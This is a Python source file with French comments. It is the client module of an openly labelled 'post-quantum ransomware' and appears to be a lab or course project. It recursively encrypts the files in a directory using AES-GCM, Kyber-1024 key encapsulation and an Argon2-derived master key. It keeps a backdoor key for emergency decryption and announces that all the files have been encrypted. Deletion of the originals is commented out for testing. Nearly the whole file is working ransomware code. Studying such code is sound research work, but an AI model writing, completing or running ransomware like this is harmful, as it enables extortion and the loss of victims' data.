"""
Module client pour le ransomware post-quantique
Gère le chiffrement et déchiffrement des fichiers
"""

import os
import json
import base64
from typing import Dict
from pathlib import Path

import config
import crypto_utils
import wordlist
from server import server


class RansomwareClient:
    """
    Client du ransomware - Responsable du chiffrement/déchiffrement des fichiers
    """

    def __init__(self, base_path: str = "."):
        """
        Initialise le client

        Args:
            base_path: Répertoire de base pour les opérations
        """
        self.base_path = Path(base_path).resolve()
        self.rootkey_path = self.base_path / config.ROOTKEY_FILENAME

    def _should_skip_file(self, file_path: Path) -> bool:
        """
        Vérifie si un fichier doit être ignoré lors du chiffrement

        Args:
            file_path: Chemin du fichier

        Returns:
            True si le fichier doit être ignoré
        """
        # Ignore les fichiers exclus
        if file_path.name in config.EXCLUDED_FILES:
            return True

        # Ignore les extensions exclues
        if file_path.suffix in config.EXCLUDED_EXTENSIONS:
            return True

        return False

    def _should_skip_dir(self, dir_name: str) -> bool:
        """
        Vérifie si un dossier doit être ignoré

        Args:
            dir_name: Nom du dossier

        Returns:
            True si le dossier doit être ignoré
        """
        return dir_name in config.EXCLUDED_DIRS

    def encrypt_directory(self, path: str = ".") -> None:
        """
        Chiffre tous les fichiers d'un dossier (récursivement)

        Args:
            path: Chemin du dossier à chiffrer
        """
        target_path = Path(path).resolve()

        print(f"\n[CLIENT] Démarrage du chiffrement de: {target_path}")

        # 1. Initialise le serveur et récupère les credentials
        print("[CLIENT] Demande d'initialisation au serveur...")
        server_data = server.initialize_server()

        password = server_data["password"]
        salt = server_data["salt"]
        argon2_params = server_data["argon2_params"]
        kyber_public_key = server_data["kyber_public_key"]
        backdoor_key = server_data["backdoor_key"]

        # 2. Dérive la Master Key avec Argon2
        print("[CLIENT] Dérivation de la Master Key...")
        master_key = crypto_utils.derive_key_argon2(
            password=password,
            salt=salt,
            **argon2_params
        )

        # 3. Génère la Root Key via Kyber
        print("[CLIENT] Génération de la Root Key avec Kyber-1024...")
        kyber_ciphertext, root_key = crypto_utils.kyber_encapsulate(kyber_public_key)

        # 4. Encapsule la Root Key avec la Master Key
        print("[CLIENT] Encapsulation de la Root Key avec la Master Key...")
        wrapped_rk_ciphertext, wrapped_rk_nonce, wrapped_rk_tag = crypto_utils.wrap_key_aes_gcm(root_key, master_key)

        # 5. Sauvegarde les informations de la Root Key dans rootkey.bin
        print(f"[CLIENT] Sauvegarde de rootkey.bin...")
        rootkey_data = {
            "wrapped_rk_ciphertext": base64.b64encode(wrapped_rk_ciphertext).decode('utf-8'),
            "wrapped_rk_nonce": base64.b64encode(wrapped_rk_nonce).decode('utf-8'),
            "wrapped_rk_tag": base64.b64encode(wrapped_rk_tag).decode('utf-8'),
            "kyber_ciphertext": base64.b64encode(kyber_ciphertext).decode('utf-8'),
            "salt": base64.b64encode(salt).decode('utf-8'),
            "argon2_params": argon2_params,
        }

        with open(self.rootkey_path, 'w') as f:
            json.dump(rootkey_data, f, indent=2)

        # 5. Parcourt et chiffre tous les fichiers
        print("[CLIENT] Parcours et chiffrement des fichiers...")
        encrypted_count = 0

        for root, dirs, files in os.walk(target_path):
            # Filtre les dossiers à ignorer
            dirs[:] = [d for d in dirs if not self._should_skip_dir(d)]

            for filename in files:
                file_path = Path(root) / filename

                # Ignore les fichiers exclus
                if self._should_skip_file(file_path):
                    print(f"  [SKIP] {file_path.name}")
                    continue

                # Chiffre le fichier
                try:
                    self._encrypt_file(file_path, root_key, backdoor_key)
                    encrypted_count += 1
                except Exception as e:
                    print(f"  [ERREUR] Échec du chiffrement de {file_path.name}: {e}")

        print(f"\n[CLIENT] Chiffrement terminé: {encrypted_count} fichier(s) chiffré(s)")
        print(f"[CLIENT] Mot de passe: {password}")
        print(f"[CLIENT] ATTENTION: Tous vos fichiers ont été chiffrés!")

    def _encrypt_file(self, file_path: Path, root_key: bytes, backdoor_key: bytes) -> None:
        """
        Chiffre un fichier individuel

        Args:
            file_path: Chemin du fichier à chiffrer
            root_key: Root Key pour encapsuler la clé du fichier
            backdoor_key: Clé de secours
        """
        print(f"  [ENCRYPT] {file_path.name}")

        # Lit le contenu du fichier
        with open(file_path, 'rb') as f:
            plaintext = f.read()

        # Génère une clé de fichier aléatoire
        file_key = crypto_utils.generate_random_key()

        # Chiffre le fichier avec AES-GCM
        ciphertext, nonce, tag = crypto_utils.encrypt_aes_gcm(plaintext, file_key)

        # Encapsule la clé de fichier avec la Root Key
        wrapped_key_ciphertext, wrapped_key_nonce, wrapped_key_tag = crypto_utils.wrap_key_aes_gcm(file_key, root_key)

        # Encapsule aussi avec la clé de secours (pour mode urgence)
        wrapped_key_backdoor_ciphertext, wrapped_key_backdoor_nonce, wrapped_key_backdoor_tag = crypto_utils.wrap_key_aes_gcm(file_key, backdoor_key)

        # Crée les métadonnées
        metadata = {
            "original_name": file_path.name,
            "wrapped_key_ciphertext": base64.b64encode(wrapped_key_ciphertext).decode('utf-8'),
            "wrapped_key_nonce": base64.b64encode(wrapped_key_nonce).decode('utf-8'),
            "wrapped_key_tag": base64.b64encode(wrapped_key_tag).decode('utf-8'),
            "wrapped_key_backdoor_ciphertext": base64.b64encode(wrapped_key_backdoor_ciphertext).decode('utf-8'),
            "wrapped_key_backdoor_nonce": base64.b64encode(wrapped_key_backdoor_nonce).decode('utf-8'),
            "wrapped_key_backdoor_tag": base64.b64encode(wrapped_key_backdoor_tag).decode('utf-8'),
            "nonce": base64.b64encode(nonce).decode('utf-8'),
            "tag": base64.b64encode(tag).decode('utf-8'),
        }

        # Sauvegarde le fichier chiffré
        encrypted_path = file_path.with_suffix(file_path.suffix + config.ENCRYPTED_EXTENSION)
        with open(encrypted_path, 'wb') as f:
            f.write(ciphertext)

        # Sauvegarde les métadonnées
        meta_path = file_path.with_suffix(file_path.suffix + config.META_EXTENSION)
        with open(meta_path, 'w') as f:
            json.dump(metadata, f, indent=2)

        # Supprime le fichier original (optionnel - commenté pour les tests)
        # file_path.unlink()

    def decrypt_all(self, path: str = ".") -> None:
        """
        Déchiffre tous les fichiers d'un dossier (récursivement)

        Args:
            path: Chemin du dossier à déchiffrer
        """
        target_path = Path(path).resolve()

        print(f"\n[CLIENT] Démarrage du déchiffrement complet de: {target_path}")

        # 1. Demande les credentials au serveur
        print("[CLIENT] Demande des credentials au serveur...")
        credentials = server.request_full_decryption_credentials()

        password = credentials["password"]
        salt = credentials["salt"]
        argon2_params = credentials["argon2_params"]

        # 2. Dérive la Master Key
        print("[CLIENT] Dérivation de la Master Key...")
        master_key = crypto_utils.derive_key_argon2(
            password=password,
            salt=salt,
            **argon2_params
        )

        # 3. Lit rootkey.bin et désencapsule la Root Key
        print("[CLIENT] Lecture de rootkey.bin...")
        if not self.rootkey_path.exists():
            raise FileNotFoundError(f"Le fichier {config.ROOTKEY_FILENAME} n'existe pas")

        with open(self.rootkey_path, 'r') as f:
            rootkey_data = json.load(f)

        wrapped_rk_ciphertext = base64.b64decode(rootkey_data["wrapped_rk_ciphertext"])
        wrapped_rk_nonce = base64.b64decode(rootkey_data["wrapped_rk_nonce"])
        wrapped_rk_tag = base64.b64decode(rootkey_data["wrapped_rk_tag"])

        print("[CLIENT] Désencapsulation de la Root Key...")
        root_key = crypto_utils.unwrap_key_aes_gcm(wrapped_rk_ciphertext, master_key, wrapped_rk_nonce, wrapped_rk_tag)

        # 4. Parcourt et déchiffre tous les fichiers
        print("[CLIENT] Parcours et déchiffrement des fichiers...")
        decrypted_count = 0

        for root, dirs, files in os.walk(target_path):
            # Filtre les dossiers à ignorer
            dirs[:] = [d for d in dirs if not self._should_skip_dir(d)]

            for filename in files:
                if not filename.endswith(config.ENCRYPTED_EXTENSION):
                    continue

                encrypted_path = Path(root) / filename

                try:
                    self._decrypt_file_with_rk(encrypted_path, root_key)
                    decrypted_count += 1
                except Exception as e:
                    print(f"  [ERREUR] Échec du déchiffrement de {filename}: {e}")

        print(f"\n[CLIENT] Déchiffrement terminé: {decrypted_count} fichier(s) déchiffré(s)")

    def _decrypt_file_with_rk(self, encrypted_path: Path, root_key: bytes) -> None:
        """
        Déchiffre un fichier avec la Root Key

        Args:
            encrypted_path: Chemin du fichier chiffré
            root_key: Root Key pour désencapsuler la clé du fichier
        """
        # Construit le chemin du fichier de métadonnées
        base_name = encrypted_path.name.replace(config.ENCRYPTED_EXTENSION, "")
        meta_path = encrypted_path.parent / (base_name + config.META_EXTENSION)

        if not meta_path.exists():
            raise FileNotFoundError(f"Métadonnées introuvables: {meta_path}")

        print(f"  [DECRYPT] {base_name}")

        # Lit les métadonnées
        with open(meta_path, 'r') as f:
            metadata = json.load(f)

        wrapped_key_ciphertext = base64.b64decode(metadata["wrapped_key_ciphertext"])
        wrapped_key_nonce = base64.b64decode(metadata["wrapped_key_nonce"])
        wrapped_key_tag = base64.b64decode(metadata["wrapped_key_tag"])
        nonce = base64.b64decode(metadata["nonce"])
        tag = base64.b64decode(metadata["tag"])
        original_name = metadata["original_name"]

        # Désencapsule la clé de fichier
        file_key = crypto_utils.unwrap_key_aes_gcm(wrapped_key_ciphertext, root_key, wrapped_key_nonce, wrapped_key_tag)

        # Lit le fichier chiffré
        with open(encrypted_path, 'rb') as f:
            ciphertext = f.read()

        # Déchiffre
        plaintext = crypto_utils.decrypt_aes_gcm(ciphertext, file_key, nonce, tag)

        # Sauvegarde le fichier déchiffré
        decrypted_path = encrypted_path.parent / original_name
        with open(decrypted_path, 'wb') as f:
            f.write(plaintext)

        # Supprime le fichier chiffré et les métadonnées (optionnel)
        # encrypted_path.unlink()
        # meta_path.unlink()

    def decrypt_file(self, file_path: str) -> None:
        """
        Déchiffre un seul fichier en demandant la clé au serveur

        Args:
            file_path: Chemin du fichier à déchiffrer
        """
        encrypted_path = Path(file_path).resolve()

        if not encrypted_path.exists():
            # Essaie d'ajouter l'extension .encrypted
            encrypted_path = Path(file_path + config.ENCRYPTED_EXTENSION).resolve()
            if not encrypted_path.exists():
                raise FileNotFoundError(f"Fichier introuvable: {file_path}")

        print(f"\n[CLIENT] Déchiffrement du fichier: {encrypted_path.name}")

        # Lit les métadonnées
        base_name = encrypted_path.name.replace(config.ENCRYPTED_EXTENSION, "")
        meta_path = encrypted_path.parent / (base_name + config.META_EXTENSION)

        if not meta_path.exists():
            raise FileNotFoundError(f"Métadonnées introuvables: {meta_path}")

        with open(meta_path, 'r') as f:
            metadata = json.load(f)

        wrapped_key_ciphertext = base64.b64decode(metadata["wrapped_key_ciphertext"])
        wrapped_key_nonce = base64.b64decode(metadata["wrapped_key_nonce"])
        wrapped_key_tag = base64.b64decode(metadata["wrapped_key_tag"])

        # Lire kyber_ciphertext depuis rootkey.bin
        if not self.rootkey_path.exists():
            raise FileNotFoundError(f"Le fichier {config.ROOTKEY_FILENAME} n'existe pas")

        with open(self.rootkey_path, 'r') as f:
            rootkey_data = json.load(f)

        kyber_ciphertext = base64.b64decode(rootkey_data["kyber_ciphertext"])

        # Demande au serveur de désencapsuler la clé
        print("[CLIENT] Demande de désencapsulation au serveur...")
        file_key = server.request_file_key_unwrap(wrapped_key_ciphertext, wrapped_key_nonce, wrapped_key_tag, kyber_ciphertext)

        # Déchiffre le fichier
        nonce = base64.b64decode(metadata["nonce"])
        tag = base64.b64decode(metadata["tag"])
        original_name = metadata["original_name"]

        with open(encrypted_path, 'rb') as f:
            ciphertext = f.read()

        plaintext = crypto_utils.decrypt_aes_gcm(ciphertext, file_key, nonce, tag)

        # Sauvegarde
        decrypted_path = encrypted_path.parent / original_name
        with open(decrypted_path, 'wb') as f:
            f.write(plaintext)

        print(f"[CLIENT] Fichier déchiffré: {decrypted_path}")

    def decrypt_folder(self, folder_path: str) -> None:
        """
        Déchiffre tous les fichiers d'un dossier (non récursif)

        Args:
            folder_path: Chemin du dossier
        """
        folder = Path(folder_path).resolve()

        if not folder.is_dir():
            raise NotADirectoryError(f"{folder_path} n'est pas un dossier")

        print(f"\n[CLIENT] Déchiffrement du dossier: {folder}")

        decrypted_count = 0

        for file_path in folder.iterdir():
            if file_path.is_file() and file_path.name.endswith(config.ENCRYPTED_EXTENSION):
                try:
                    self.decrypt_file(str(file_path))
                    decrypted_count += 1
                except Exception as e:
                    print(f"  [ERREUR] Échec: {e}")

        print(f"[CLIENT] {decrypted_count} fichier(s) déchiffré(s)")

    def change_password(self) -> None:
        """
        Change le mot de passe et met à jour rootkey.bin
        """
        print("\n[CLIENT] Changement de mot de passe...")

        # Génère un nouveau mot de passe
        new_password = wordlist.generate_random_password()
        print(f"[CLIENT] Nouveau mot de passe: {new_password}")

        # Génère nouveau salt
        new_salt = crypto_utils.generate_random_salt()

        # Utilise les mêmes paramètres Argon2
        new_argon2_params = {
            "time_cost": config.ARGON2_TIME_COST,
            "memory_cost": config.ARGON2_MEMORY_COST,
            "parallelism": config.ARGON2_PARALLELISM,
            "hash_len": config.ARGON2_HASH_LEN,
        }

        # Lire kyber_ciphertext depuis rootkey.bin
        if not self.rootkey_path.exists():
            raise FileNotFoundError(f"Le fichier {config.ROOTKEY_FILENAME} n'existe pas")

        with open(self.rootkey_path, 'r') as f:
            rootkey_data = json.load(f)

        kyber_ciphertext = base64.b64decode(rootkey_data["kyber_ciphertext"])

        # Demande au serveur de changer le mot de passe
        print("[CLIENT] Envoi de la demande au serveur...")
        result = server.change_password(new_password, new_salt, new_argon2_params, kyber_ciphertext)

        # Met à jour rootkey.bin
        print("[CLIENT] Mise à jour de rootkey.bin...")
        rootkey_data = {
            "wrapped_rk_ciphertext": base64.b64encode(result["wrapped_rk_ciphertext"]).decode('utf-8'),
            "wrapped_rk_nonce": base64.b64encode(result["wrapped_rk_nonce"]).decode('utf-8'),
            "wrapped_rk_tag": base64.b64encode(result["wrapped_rk_tag"]).decode('utf-8'),
            "kyber_ciphertext": base64.b64encode(kyber_ciphertext).decode('utf-8'),
            "salt": base64.b64encode(result["salt"]).decode('utf-8'),
            "argon2_params": result["argon2_params"],
        }

        with open(self.rootkey_path, 'w') as f:
            json.dump(rootkey_data, f, indent=2)

        print("[CLIENT] Mot de passe changé avec succès!")
        print(f"[CLIENT] Nouveau mot de passe: {new_password}")

    def emergency_decrypt_all(self, path: str = ".") -> None:
        """
        Déchiffre tous les fichiers en mode urgence avec la clé de secours

        Args:
            path: Chemin du dossier à déchiffrer
        """
        target_path = Path(path).resolve()

        print(f"\n[CLIENT] [URGENCE] Déchiffrement d'urgence de: {target_path}")

        # Demande la clé de secours au serveur
        print("[CLIENT] Demande de la clé de secours au serveur...")
        backdoor_key = server.emergency_decrypt()

        # Parcourt et déchiffre tous les fichiers
        print("[CLIENT] Déchiffrement avec la clé de secours...")
        decrypted_count = 0

        for root, dirs, files in os.walk(target_path):
            dirs[:] = [d for d in dirs if not self._should_skip_dir(d)]

            for filename in files:
                if not filename.endswith(config.ENCRYPTED_EXTENSION):
                    continue

                encrypted_path = Path(root) / filename

                try:
                    self._decrypt_file_with_backdoor(encrypted_path, backdoor_key)
                    decrypted_count += 1
                except Exception as e:
                    print(f"  [ERREUR] Échec: {e}")

        print(f"\n[CLIENT] Déchiffrement d'urgence terminé: {decrypted_count} fichier(s)")

    def _decrypt_file_with_backdoor(self, encrypted_path: Path, backdoor_key: bytes) -> None:
        """
        Déchiffre un fichier avec la clé de secours

        Args:
            encrypted_path: Chemin du fichier chiffré
            backdoor_key: Clé de secours
        """
        base_name = encrypted_path.name.replace(config.ENCRYPTED_EXTENSION, "")
        meta_path = encrypted_path.parent / (base_name + config.META_EXTENSION)

        if not meta_path.exists():
            raise FileNotFoundError(f"Métadonnées introuvables: {meta_path}")

        print(f"  [URGENCE] {base_name}")

        with open(meta_path, 'r') as f:
            metadata = json.load(f)

        wrapped_key_backdoor_ciphertext = base64.b64decode(metadata["wrapped_key_backdoor_ciphertext"])
        wrapped_key_backdoor_nonce = base64.b64decode(metadata["wrapped_key_backdoor_nonce"])
        wrapped_key_backdoor_tag = base64.b64decode(metadata["wrapped_key_backdoor_tag"])
        nonce = base64.b64decode(metadata["nonce"])
        tag = base64.b64decode(metadata["tag"])
        original_name = metadata["original_name"]

        # Désencapsule avec la clé de secours
        file_key = crypto_utils.unwrap_key_aes_gcm(wrapped_key_backdoor_ciphertext, backdoor_key, wrapped_key_backdoor_nonce, wrapped_key_backdoor_tag)

        with open(encrypted_path, 'rb') as f:
            ciphertext = f.read()

        plaintext = crypto_utils.decrypt_aes_gcm(ciphertext, file_key, nonce, tag)

        decrypted_path = encrypted_path.parent / original_name
        with open(decrypted_path, 'wb') as f:
            f.write(plaintext)
